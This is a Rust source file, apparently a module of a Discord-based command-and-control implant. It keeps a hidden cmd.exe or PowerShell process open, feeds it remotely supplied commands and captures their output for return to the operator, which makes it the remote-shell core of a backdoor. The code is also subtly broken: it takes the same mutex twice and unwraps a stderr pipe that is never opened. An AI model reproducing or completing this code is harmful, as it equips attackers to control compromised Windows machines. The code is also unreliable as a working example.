use std::process::Stdio;
use tokio::io::{AsyncWriteExt, BufReader};
use tokio::process::{Child, Command};
use std::sync::Arc;
use tokio::sync::{Mutex};
use crate::errors::DiscordC2Error;
use lazy_static::lazy_static;
use tokio::io::AsyncBufReadExt;

#[derive(Clone, PartialEq, Eq, Debug, Copy)]
pub enum ShellType {
    Powershell,
    Cmd,
}

impl ShellType {
    pub fn from_str(s: &str) -> Result<ShellType, DiscordC2Error> {
        match s {
            "powershell.exe" => Ok(ShellType::Powershell),
            "cmd.exe" => Ok(ShellType::Cmd),
            _ => Err(DiscordC2Error::InvalidShellType),
        }
    }
    pub fn as_str(&self) -> &str {
        match self {
            ShellType::Powershell => "powershell.exe",
            ShellType::Cmd => "cmd.exe",
        }
    }

    pub fn format_output(&self, s: &str) -> String {
        match self {
            ShellType::Powershell => {
                s.replace("; echo ___CMDDELIM___", "")
            }
            ShellType::Cmd => {
                s.replace("& echo ___CMDDELIM___", "")
            }
        }
    }

    pub async fn handle_stdin(&self, handler: &ProcessHandler, command: &str) -> Result<(), DiscordC2Error> {
        let mut process = handler.process.lock().await;

        match self {
            ShellType::Powershell => {
                process.stdin.as_mut().unwrap().write_all(command.as_bytes()).await?;
                process.stdin.as_mut().unwrap().write_all(b"; echo ___CMDDELIM___").await?;
                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                process.stdin.as_mut().unwrap().flush().await?;
                Ok(())
            }
            ShellType::Cmd => {
                process.stdin.as_mut().unwrap().write_all(command.as_bytes()).await?;
                process.stdin.as_mut().unwrap().write_all(b" & echo ___CMDDELIM___").await?;
                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                process.stdin.as_mut().unwrap().flush().await?;
                Ok(())
            }
        }
    }
}

pub struct ProcessHandler {
    pub shell_type: ShellType,
    process: Arc<Mutex<Child>>,
}

lazy_static! {
    static ref PROCESS_HANDLER: Mutex<Option<Arc<ProcessHandler>>> = Mutex::new(None);
}

impl ProcessHandler {
    async fn new(shell_type: ShellType) -> Result<Self, DiscordC2Error> {
        let process = open_shell(shell_type.clone()).await?;
        Ok(ProcessHandler {
            shell_type,
            process: Arc::new(Mutex::new(process)),
        })
    }

    pub async fn instance(shell_type: ShellType) -> Result<Arc<Self>, DiscordC2Error> {
        let mut process_handler = PROCESS_HANDLER.lock().await;
        if process_handler.is_none() {
            let instance = ProcessHandler::new(shell_type).await?;
            *process_handler = Some(Arc::new(instance));
        }
        Ok(process_handler.as_ref().unwrap().clone())
    }

    pub async fn run_command(&self, command: &str) -> Result<String, DiscordC2Error> {
        // Call the proper stdin function depending on the shell type
        self.shell_type.handle_stdin(self, command).await?;

        // Lock the process so we can read the output
        let mut process = self.process.lock().await;

        // Read the process's stdout line by line
        let stdout_reader = BufReader::new( process.stdout.as_mut().unwrap());
        let mut out_lines = stdout_reader.lines();

        let mut process = self.process.lock().await;

        let stderr_reader = BufReader::new( process.stderr.as_mut().unwrap());
        let mut err_lines = stderr_reader.lines();

        let mut output = String::new();

        while let Some(line) = out_lines.next_line().await? {
            if !line.contains("echo") && line.contains("___CMDDELIM___") {
                break;
            }
            output.push_str(&line);
            output.push('\n');
        }

        while let Some(line) = err_lines.next_line().await? {
            output.push_str(&line);
            output.push('\n');
        }


        let formatted_output = self.shell_type.format_output(&output);

        Ok(formatted_output)
    }

    pub async fn exit(&self) -> Result<(), DiscordC2Error> {
        let mut process = self.process.lock().await;

        // Send an exit command to the process's stdin based on the shell type
        let exit_command = match self.shell_type.as_str() {
            "cmd.exe" => "exit",
            "powershell.exe" => {
                println!("Exiting the process");
                "exit"
            },
            _ => panic!("Unsupported shell type"),
        };

        process.stdin.as_mut().unwrap().write_all(exit_command.as_bytes()).await?;
        process.stdin.as_mut().unwrap().write_all(b"\n").await?;
        process.kill().await?;


        let mut process_handler = PROCESS_HANDLER.lock().await;
        *process_handler = None;

        Ok(())
    }

}

async fn open_shell(shell_type: ShellType) -> Result<tokio::process::Child, DiscordC2Error> {
    let child = Command::new(shell_type.as_str())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .map_err(|e| DiscordC2Error::from(e))?;

    Ok(child)
}
